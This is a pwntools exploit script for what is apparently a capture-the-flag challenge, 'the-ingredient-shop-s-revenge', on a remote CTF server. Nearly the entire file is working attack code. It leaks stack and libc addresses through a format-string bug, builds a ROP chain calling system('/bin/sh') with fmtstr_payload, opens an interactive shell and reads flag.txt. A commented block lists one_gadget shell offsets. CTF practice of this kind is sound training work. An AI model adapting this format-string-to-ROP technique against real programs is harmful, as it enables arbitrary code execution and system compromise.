from pwn import *

# context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./shop-revenge.patch"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("the-ingredient-shop-s-revenge.challs.brunnerne.xyz", 32000)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


shell = 0x00119D

payload = b""
# io.sendline(payload)

ddebug("breakrva 0x1410\n  breakrva 0x1352\n continue")

# fmtstr_payload(8, )
# 43$ ret
io.sendlineafter("exit\n", "--%42$p--%46$p--%15$p")

io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
ret_stack = leak - 8
log.success("ret :-----> " + hex(ret_stack))

io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
libc.address = leak -  0x2044e0
log.success("libc.address :-----> " + hex(libc.address))
"""
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
0xef4ce execve("/bin/sh", rbp-0x50, r12)
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
0x000000000010f75b : pop rdi ; ret
0x000000000002882f : ret
"""
one = (0x583f3, 0x583ec, 0xef4ce, 0xef52b)
shell += libc.address + one[3] 

pop_rdi = libc.address + 0x000000000010f75b
ret = libc.address + 0x000000000002882f
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))

rop = {
        ret_stack : pop_rdi,
        ret_stack+8: binsh_addr,
        ret_stack+16: ret,
        ret_stack+24: system_addr
        }
payload = fmtstr_payload(8, rop, write_size="short")
#payload = fmtstr_payload(8, {ret_stack: shell}, write_size="byte")
io.sendlineafter("exit\n", payload)

sleep(4)
io.sendline(b"cat flag.txt")

io.interactive()
